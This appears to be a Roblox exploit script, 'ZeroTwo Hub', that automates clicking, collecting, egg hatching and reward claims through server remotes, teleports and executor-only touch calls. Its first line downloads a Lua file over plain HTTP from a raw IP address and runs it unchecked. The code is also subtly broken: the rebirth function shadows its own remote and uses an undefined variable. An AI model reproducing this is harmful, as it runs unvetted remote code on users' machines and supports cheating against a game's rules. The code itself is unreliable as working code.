local library = loadstring(game:HttpGet("http://193.83.159.126:3000/getFile?Filename=uilib.lua"))()
local window = library:CreateWindow("ZeroTwo Hub")
local main = window:CreateFolder("Main")

local lp = game.Players.LocalPlayer

function touch(part)
  if(type(part) == "table") then
    for i,v in pairs(part) do
      touch(v)
      game:GetService("RunService").RenderStepped:Wait()
    end
  else
    if(part:IsA("BasePart")) then
      if(part.Transparency ~= 1 and part:FindFirstChildOfClass("TouchTransmitter")) then
        firetouchinterest(part,lp.Character.HumanoidRootPart,0)
        game:GetService("RunService").Stepped:Wait()
        firetouchinterest(part,lp.Character.HumanoidRootPart,1)
      end
    end
    if(part:IsA("Folder") or part:IsA("Model")) then
      touch(part:GetChildren())
    end
  end
  return true
end

local click = game:GetService("ReplicatedStorage").Remotes["⚡🖱️"]
local rebirth = game:GetService("ReplicatedStorage").Remotes["⚡︽"]
local egg = game:GetService("ReplicatedStorage").Remotes["⚡🥚"]

main:Toggle("Click",function(toggle)
  _G.TAP = toggle
  while wait() and _G.TAP do
    click:FireServer()
  end
end)

main:Toggle("Collect Diamonds",function(toggle)
  _G.CD = toggle
  while wait() and _G.CD do
    for i,v in pairs(game:GetService("Workspace").Coletaveis:GetChildren()) do
      v.CFrame = lp.Character.HumanoidRootPart.CFrame
    end
  end
end)

function rebirth(num)
  local rebirthargs = {
      [1] = tostring(num) or "1"
  }
  rebirth:FireServer(unpack(args))
end

function hatch(eggarg)
  local args = {
      [1] = eggarg or workspace.PromptEgg.Common,
      [2] = "E"
  }
  egg:InvokeServer(unpack(args))
end

local eggs = {}
for i,v in pairs(workspace.PromptEgg:GetChildren()) do
    eggs[#eggs+1] = v.Name
end

main:Dropdown("Eggs",eggs,true,function(value)
  _G.Hatch = workspace.PromptEgg[value]
end)

main:Toggle("Auto Hatch",function(toggle)
  _G.AH = toggle
  while wait() and _G.AH do
    if(_G.Hatch) then
      hatch(_G.Hatch)
    end
  end
end)


function tp(part)
  if(type(part) == "table") then
    for i,v in pairs(part) do
      tp(v)
      game:GetService("RunService").RenderStepped:Wait()
    end
  else
    if(part:IsA("BasePart")) then
      lp.Character.HumanoidRootPart.CFrame = part.CFrame
      wait(0.5)
    end
    if(part:IsA("Folder") or part:IsA("Model")) then
      tp(part:GetChildren())
    end
  end
  return true
end

main:Button("Claim Daily and Group",function()
  tp(game:GetService("Workspace").Rewards:GetChildren())
end)
